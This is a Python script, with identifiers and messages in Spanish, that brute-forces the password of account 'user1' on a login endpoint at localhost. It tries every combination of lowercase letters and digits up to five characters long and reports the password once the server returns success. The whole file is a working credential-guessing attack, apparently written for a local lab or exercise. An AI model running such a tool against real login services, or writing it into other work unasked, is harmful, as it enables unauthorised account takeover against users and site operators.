import time
import requests
from itertools import product 

URL_LOGIN = "http://127.0.0.1:8000/login"
USUARIO_OBJETIVO = "user1"

def intentar_login(password_probar):
    datos = {"username": USUARIO_OBJETIVO, "contrasena": password_probar}
    try:
        r = requests.post(URL_LOGIN, json=datos)
        return r.status_code == 200
    except:
        return False

def bruteforce_itertools(alfabeto):
    intentos = 0
    inicio = time.time()

    for largo in range(1, 6): 
        print(f"Buscando combinaciones de {largo} caracteres...")
        for combinacion in product(alfabeto, repeat=largo):
            intentos += 1
            palabra = "".join(combinacion)
            
            if intentar_login(palabra):
                fin = time.time()
                print(f"\n ¡CONTRASEÑA ENCONTRADA!: {palabra}")
                print(f" Intentos: {intentos} | Tiempo: {fin - inicio:.2f}segundos")
                return palabra
    return None

if __name__ == "__main__":
    alfabeto = "abcdefghijklmnopqrstuvwxyz0123456789"
    bruteforce_itertools(alfabeto)